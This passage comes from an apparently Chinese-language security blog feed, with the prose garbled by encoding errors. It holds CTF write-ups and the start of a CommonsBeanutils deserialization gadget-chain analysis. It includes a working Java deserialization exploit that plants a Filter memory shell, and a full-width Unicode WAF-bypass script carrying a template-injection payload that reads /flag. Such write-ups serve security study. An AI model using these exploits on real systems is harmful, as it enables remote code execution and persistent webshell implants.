class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå…¥å£ç±»çš„æ„å»ºæµç¨‹å°±å’ŒCC5ä¸€è‡´äº†ï¼Œåªè¦è®©<code>val</code>çš„å€¼ä¸º<code>ConfigDataWrapper</code>å®ä¾‹å°±è¡Œ</p><p>æˆ‘ä»¬è¯•ç€åœ¨ç±»åŠ è½½çš„æ—¶å€™åŠ¨æ€æ³¨å…¥Filterå†…å­˜é©¬ï¼Œè¯¥ç±»çš„é™æ€ä»£ç å—æ‰§è¡Œæ—¶å®ä¾‹åŒ–ä¸€ä¸ªæ¶æ„Filterå¹¶æ‰§è¡Œæ³¨å†Œæµç¨‹ï¼Œæ¶æ„è¢«åŠ è½½ç±»çš„æ„å»ºå’ŒSpringBootæ³¨å…¥Filterå†…å­˜é©¬çš„æµç¨‹å¯ä»¥çœ‹<a href="https://leyi.live/2026/01/20/%E6%95%A3%E9%A2%981-20/">æ•£é¢˜1.20</a>çš„æœ€åä¸€éƒ¨åˆ†</p><p>å‰é¢<code>ConfigDataWrapper</code>å¯¹å­—èŠ‚æ•°ç»„è¿›è¡Œäº†ä¸€æ¬¡å¼‚æˆ–ï¼Œæˆ‘ä»¬å†å¼‚æˆ–ä¸€æ¬¡å°±æ˜¯åŸå­—èŠ‚æ•°ç»„äº†</p><p>æ ¹æ®å‰é¢çš„åˆ†ææ„å»ºExp</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unictf.ctf.tools.ConfigDataWrapper;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\leyi\\IntelliJTest\\serialize\\UniJava\\target\\classes\\InjectClass.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] encrypted = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; ++i) &#123;</span><br><span class="line">            encrypted[i] = (<span class="type">byte</span>)(bytes[i] ^ <span class="number">255</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigDataWrapper</span> <span class="variable">configDataWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConfigDataWrapper</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">sign</span> <span class="operator">=</span> configDataWrapper.getClass().getDeclaredField(<span class="string">&quot;sign&quot;</span>);</span><br><span class="line">        sign.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        sign.set(configDataWrapper, <span class="string">&quot;ready&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">classByte</span> <span class="operator">=</span> configDataWrapper.getClass().getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        classByte.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classByte.set(configDataWrapper, encrypted);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, configDataWrapper);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;uniCTF.ser&quot;</span>)));</span><br><span class="line">        oos.writeUTF(<span class="string">&quot;InternalManager&quot;</span>);</span><br><span class="line">        oos.writeInt(<span class="number">2025</span>);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;uniCTF.ser&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;uniCTF.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾€<code>/api/user/settings/import</code>è·¯ç”±æ³¨å…¥Base64æ•°æ®ï¼Œæ˜¾ç¤ºæˆåŠŸ</p><p><img src="/img/post/image-20260129132830831.png" alt="image-20260129132830831"></p><p>flagåœ¨ç¯å¢ƒå˜é‡ä¸­</p><p><img src="/img/post/33e3ce3ff96044db2f60b7e209fd1ac0.png" alt="33e3ce3ff96044db2f60b7e209fd1ac0"></p><br/><h2 id="Intrasight"><a href="#Intrasight" class="headerlink" title="Intrasight"></a>Intrasight</h2><p>è¿™é¢˜æ˜¯é˜Ÿå‹å†™çš„ï¼Œè¿™é‡Œæˆ‘å°è¯•å¤ç°</p><p>8001ç«¯å£å¼€äº†ç®¡ç†å‘˜æœåŠ¡ï¼Œè¯¥ç«¯å£ä¸‹<code>/redirect_ws</code>ä¼šæä¾›ä¸€æ¬¡æ€§çš„tokenï¼Œå¹¶å°†æˆ‘ä»¬å¼•å¯¼è¿›9000ç«¯å£</p><p><img src="/img/post/image-20260131002959413.png" alt="image-20260131002959413"></p><p>ä½¿ç”¨tokenä¸9000ç«¯å£è¿›è¡Œwsè¿æ¥çš„å»ºç«‹ï¼Œæ˜¾ç¤ºå¤±è´¥</p><p><img src="/img/post/image-20260131003327218.png" alt="image-20260131003327218"></p><p>ç¼ºå°‘å¿…è¦è¯·æ±‚å¤´<code>X-Internal-Token</code>å’Œ<code>origin</code>ï¼Œè¡¥ä¸Šåè¿æ¥æˆåŠŸ</p><p><img src="/img/post/image-20260131003848789.png" alt="image-20260131003848789"></p><p>æµ‹è¯•å¾—åˆ°templateå­—æ®µå­˜åœ¨æ¨¡æ¿æ³¨å…¥</p><p><img src="/img/post/image-20260131004600147.png" alt="image-20260131004600147"></p><p>ä¿®æ”¹payloadè·å–flag</p><p><img src="/img/post/image-20260131004636635.png" alt="image-20260131004636635"></p><br/><h2 id="GlyphWeaver"><a href="#GlyphWeaver" class="headerlink" title="GlyphWeaver"></a>GlyphWeaver</h2><p>ä¾æ—§æ˜¯é˜Ÿå‹åšå‡ºæ¥çš„ï¼Œæ­¤å¤„ä¸ºå¤ç°</p><p>æœ‰ä¸€ä¸ªå¯ä»¥æŠŠä¸åŒæ ·å¼å¯¼å‡ºä¸ºå“ˆå¸Œçš„æ¥å£ï¼Œè¿™é‡Œå¯¹æ¨¡æ¿æ³¨å…¥åšäº†åŸºç¡€çš„WAF</p><p><img src="/img/post/image-20260131005440769.png" alt="image-20260131005440769"></p><p>è¿™é‡Œéœ€è¦ä½¿ç”¨<strong>å…¨è§’å­—ç¬¦ç»•è¿‡</strong>ï¼Œåˆç§°Unicode æ ‡å‡†åŒ– (NFKC) æ¼æ´ã€‚åœ¨ Python çš„ Web ç¯å¢ƒä¸­ï¼Œä¸ºäº†å¤„ç†å…¨çƒå„åœ°çš„å­—ç¬¦è¾“å…¥ï¼Œåç«¯å¸¸ä½¿ç”¨ <code>unicodedata.normalize(&#39;NFKC&#39;, input)</code> æ¥ç»Ÿä¸€å­—ç¬¦æ ¼å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†å­—ç¬¦å˜æˆå…¨è§’çš„ä»è€Œç»•è¿‡WAFï¼Œå› ä¸ºé¢˜ç›®æç¤ºè¯´æ”¯æŒå¤šç§å­—ä½“ï¼Œæ¨æµ‹æ ¡éªŒæ˜¯åœ¨è½¬æ¢æˆæ ‡å‡†æ ¼å¼ä¹‹å‰</p><p>å­—ç¬¦è½¬æ¢çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_full_width</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å°†åŠè§’å­—ç¬¦è½¬æ¢ä¸ºå…¨è§’å­—ç¬¦&quot;&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        code = <span class="built_in">ord</span>(char)</span><br><span class="line">        <span class="comment"># å¤„ç†åŸºæœ¬æ‹‰ä¸å­—æ¯å’Œæ•°å­—</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">33</span> &lt;= code &lt;= <span class="number">126</span>:  <span class="comment"># å¯æ‰“å°ASCIIå­—ç¬¦ï¼ˆä¸åŒ…æ‹¬ç©ºæ ¼ï¼‰</span></span><br><span class="line">            result.append(<span class="built_in">chr</span>(code + <span class="number">0xFEE0</span>))</span><br><span class="line">        <span class="keyword">elif</span> char == <span class="string">&#x27; &#x27;</span>:  <span class="comment"># åŠè§’ç©ºæ ¼è½¬å…¨è§’ç©ºæ ¼</span></span><br><span class="line">            result.append(<span class="string">&#x27;ã€€&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line">test_text = <span class="string">&quot;&#123;&#123;lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">full_width_text = to_full_width(test_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;åŸæ–‡æœ¬:&quot;</span>, test_text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å…¨è§’æ–‡æœ¬:&quot;</span>, full_width_text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;é•¿åº¦å¯¹æ¯”:&quot;</span>, <span class="built_in">len</span>(test_text), <span class="string">&quot;â†’&quot;</span>, <span class="built_in">len</span>(full_width_text))</span><br></pre></td></tr></table></figure><p>ç»•è¿‡æˆåŠŸï¼Œè·å–flag</p><p><img src="/img/post/image-20260131120107585.png" alt="image-20260131120107585"></p><p>å…¶ä»–é¢˜ç›®å°±ç­‰å®˜æ–¹çš„WPäº†ï¼Œæˆ‘ä¹Ÿåœ¨ç­‰</p><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> XML </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsBeanutilsååºåˆ—åŒ–é“¾</title>
      <link href="/2026/01/28/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"/>
      <url>/2026/01/28/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsBeanutilsååºåˆ—åŒ–é“¾"><a href="#CommonsBeanutilsååºåˆ—åŒ–é“¾" class="headerlink" title="CommonsBeanutilsååºåˆ—åŒ–é“¾"></a>CommonsBeanutilsååºåˆ—åŒ–é“¾</h1><p>CommonsBeanutilsæ˜¯Apacheæä¾›çš„ä¸€æ¬¾ç”¨äºæ“ä½œ JavaBean çš„å·¥å…·æ–¹æ³•ï¼Œè¯¥ä¾èµ–åœ¨&lt;&#x3D;1.9.2ç‰ˆæœ¬å­˜åœ¨ååºåˆ—åŒ–é«˜å±æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ–¹æ³•åˆ©ç”¨é“¾åœ¨ååºåˆ—åŒ–æ—¶è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œ</p><br/><h2 id="åˆ©ç”¨é“¾åŸç†"><a href="#åˆ©ç”¨é“¾åŸç†" class="headerlink" title="åˆ©ç”¨é“¾åŸç†"></a>åˆ©ç”¨é“¾åŸç†</h2><p>è¯¥é“¾ä½¿ç”¨<code>TemplatesImpl</code>åŠ¨æ€ç±»åŠ è½½çš„æ–¹å¼è¿›è¡Œä»£ç æ‰§è¡Œï¼Œå…ˆå‰æˆ‘ä»¬çŸ¥é“éœ€è¦è§¦å‘è¯¥ç±»çš„<code>newTransformer()</code>æ–¹æ³•æ¥è¿›è¡Œç±»åŠ è½½ã€å®ä¾‹åŒ–ï¼Œè¯¥æ–¹æ³•å…¶å®ä¹Ÿè¢«<code>TemplatesImpl.getOutputProperties()</code>è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>CommonsBeanutilsä¾èµ–ä¸­ï¼Œå·¥å…·ç±»<code>PropertyUtils</code>æ˜¯ä¸€ä¸ªç”¨äºè·å–JavaBeanå¯¹è±¡å±æ€§çš„ç±»ï¼Œå…¶<code>getProperty()</code>æ–¹æ³•æ¥æ”¶ä¸€ä¸ªObjectå¯¹è±¡å’Œä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¯¥æ–¹æ³•ç”¨äºè¿”å›å­—ç¬¦ä¸²å¯¹åº”çš„å­—æ®µå€¼</p><p>è¯¥å·¥å…·ç±»è°ƒç”¨çš„æ˜¯<code>PropertyUtilsBean</code>çš„åŒåæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="keyword">return</span> PropertyUtilsBean.getInstance().getProperty(bean, name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>PropertyUtilsBean</code>çš„<code>getProperty()</code>æ–¹æ³•åˆè°ƒç”¨äº†<code>getNestedProperty()</code>ï¼Œç”±äº<code>getProperty()</code>æ”¯æŒåµŒå¥—æŸ¥è¯¢å€¼ï¼Œ<code>getNestedProperty()</code>å°±æ˜¯ç”¨äºè¿›è¡Œè§£åµŒå¥—çš„ï¼Œè·å–æœ€ç»ˆè¦å–å€¼çš„å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getNestedProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="keyword">if</span> (bean == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No bean specified&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No name specified for bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="built_in">this</span>.resolver.hasNested(name)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">next</span> <span class="operator">=</span> <span class="built_in">this</span>.resolver.next(name);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">nestedBean</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">                    nestedBean = <span class="built_in">this</span>.getPropertyOfMapBean((Map)bean, next);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.isMapped(next)) &#123;</span><br><span class="line">                    nestedBean = <span class="built_in">this</span>.getMappedProperty(bean, next);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.isIndexed(next)) &#123;</span><br><span class="line">                    nestedBean = <span class="built_in">this</span>.getIndexedProperty(bean, next);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    nestedBean = <span class="built_in">this</span>.getSimpleProperty(bean, next);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (nestedBean == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NestedNullException</span>(<span class="string">&quot;Null property value for &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                bean = nestedBean;</span><br><span class="line">                name = <span class="built_in">this</span>.resolver.remove(name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">                bean = <span class="built_in">this</span>.getPropertyOfMapBean((Map)bean, name);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.isMapped(name)) &#123;</span><br><span class="line">                bean = <span class="built_in">this</span>.getMappedProperty(bean, name);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.isIndexed(name)) &#123;</span><br><span class="line">                bean = <span class="built_in">this</span>.getIndexedProperty(bean, name);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bean = <span class="built_in">this</span>.getSimpleProperty(bean, name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> bean;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰åµŒå¥—æ—¶ï¼Œåˆ™ä¼šè°ƒç”¨<code>getSimpleProperty()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getSimpleProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="keyword">if</span> (bean == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No bean specified&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No name specified for bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.hasNested(name)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Nested property names are not allowed: Property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.isIndexed(name)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Indexed property names are not allowed: Property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.resolver.isMapped(name)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Mapped property names are not allowed: Property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on bean class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> DynaBean) &#123;</span><br><span class="line">            <span class="type">DynaProperty</span> <span class="variable">descriptor</span> <span class="operator">=</span> ((DynaBean)bean).getDynaClass().getDynaProperty(name);</span><br><span class="line">            <span class="keyword">if</span> (descriptor == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(<span class="string">&quot;Unknown property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on dynaclass &#x27;&quot;</span> + ((DynaBean)bean).getDynaClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ((DynaBean)bean).get(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">PropertyDescriptor</span> <span class="variable">descriptor</span> <span class="operator">=</span> <span class="built_in">this</span>.getPropertyDescriptor(bean, name);</span><br><span class="line">            <span class="keyword">if</span> (descriptor == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(<span class="string">&quot;Unknown property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">readMethod</span> <span class="operator">=</span> <span class="built_in">this</span>.getReadMethod(bean.getClass(), descriptor);</span><br><span class="line">                <span class="keyword">if</span> (readMethod == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(<span class="string">&quot;Property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; has no getter method in class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);</span><br><span class="line">                    <span class="keyword">return</span> value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•å‰é¢è¿›è¡Œäº†ä¸€ç³»åˆ—æ£€æŸ¥ï¼Œæœ€åè¿˜æ˜¯è°ƒç”¨äº†åå°„æ–¹æ³•<code>invokeMethod()</code>å»å–å€¼ï¼Œæ–¹æ³•<code>readMethod</code>åœ¨<code>getReadMethod()</code>æ–¹æ³•è·å–ï¼Œå¦‚æœ<code>bean</code>ä¸º<code>TemplatesImpl</code>ï¼Œ<code>name</code>ä¸º<code>outputProperties</code>ï¼Œè·å–çš„æ–¹æ³•å°±æ˜¯<code>getOutputProperties()</code></p><p><img src="/img/post/image-20260128173852093.png" alt="image-20260128173852093"></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å¯»æ‰¾<code>getProperty()</code>çš„ä¸Šå±‚ï¼Œ<code>BeanComparator.compare()</code>è°ƒç”¨äº†è¯¥æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(T o1, T o2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.property == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.internalCompare(o1, o2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty(o1, <span class="built_in">this</span>.property);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty(o2, <span class="built_in">this</span>.property);</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.internalCompare(value1, value2);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException iae) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException ite) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException nsme) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åªéœ€å°†<code>o1</code>å’Œ<code>o2</code>è®¾ç½®ä¸ºæ¶æ„Templatesï¼Œ<code>this.property</code>è®¾ç½®ä¸ºå­—ç¬¦ä¸²<code>outputProperties</code>ï¼Œå°±å’ŒååŠæ®µè¿é€šäº†ï¼Œ<code>BeanComparator.compare()</code>çš„ä¸Šå±‚è‡ªç„¶å°±æ˜¯<code>PriorityQueue.readObject()</code>ï¼Œé€šè¿‡å‰é¢CC2äº†è§£åˆ°åœ¨<code>PriorityQueue</code>ç±»çš„<code>readObject()</code>æ–¹æ³•ä¸­ï¼Œä¼šä¸€è·¯è°ƒç”¨åˆ°<code>comparator.compare()</code>æ–¹æ³•ï¼Œå°†<code>comparator</code>å±æ€§è®¾ç½®ä¸º<code>BeanComparator</code>å³å¯</p><br/><h2 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ " class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ 